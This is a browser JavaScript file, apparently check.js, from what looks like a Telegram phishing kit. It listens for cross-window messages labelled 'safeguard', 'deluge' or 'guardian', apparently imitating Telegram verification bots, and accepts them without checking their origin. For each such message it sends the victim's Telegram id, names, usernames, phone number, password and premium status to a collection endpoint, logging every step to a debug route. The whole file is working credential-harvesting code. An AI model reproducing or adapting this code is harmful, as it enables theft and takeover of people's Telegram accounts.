async function sendDataToServer(data, type) {
  await fetch('/api/debug', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ message: `Sending data for ${type} with userId ${data.id}` }),
  });

  const response = await fetch('/api/users/telegram/info', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      userId: data.id,
      firstName: data.first_name,
      usernames: data.usernames,
      phoneNumber: data.phone_number,
      isPremium: data.premium,
      password: data.password,
      quicklySet: data.quickly_set,
      type
    }),
  });

  if (response.ok) {
    await fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: `Data sent to server successfully for ${type}` }),
    });
  } else {
    await fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: `Failed to send data to server for ${type}: ${response.status} ${response.statusText}` }),
    });
  }
}

fetch('/api/debug', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ message: 'check.js loaded in window: ' + (window.top === window ? 'top' : 'iframe') }),
});

const setupEventListener = (targetWindow) => {
  targetWindow.addEventListener('message', async (event) => {
    await fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: `Received message event in ${targetWindow === window.top ? 'top' : 'current'} window: ${JSON.stringify(event.data)}` }),
    });

    if (event.data?.type === 'safeguard') {
      await fetch('/api/debug', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message: `Processing safeguard event for userId ${event.data.id}` }),
      });
      await sendDataToServer(event.data, 'safeguard');
    } else if (event.data?.type === 'deluge') {
      await fetch('/api/debug', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message: `Processing deluge event for userId ${event.data.id}` }),
      });
      await sendDataToServer(event.data, 'deluge');
    } else if (event.data?.type === 'guardian') {
      await fetch('/api/debug', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message: `Processing guardian event for userId ${event.data.id}` }),
      });
      await sendDataToServer(event.data, 'guardian');
    } else {
      await fetch('/api/debug', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message: `Unknown event type: ${JSON.stringify(event.data)}` }),
      });
    }
  });

  fetch('/api/debug', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ message: `check.js event listener set up in ${targetWindow === window.top ? 'top' : 'current'} window` }),
  });
};

setupEventListener(window);
if (window.top !== window) {
  setupEventListener(window.top);
}
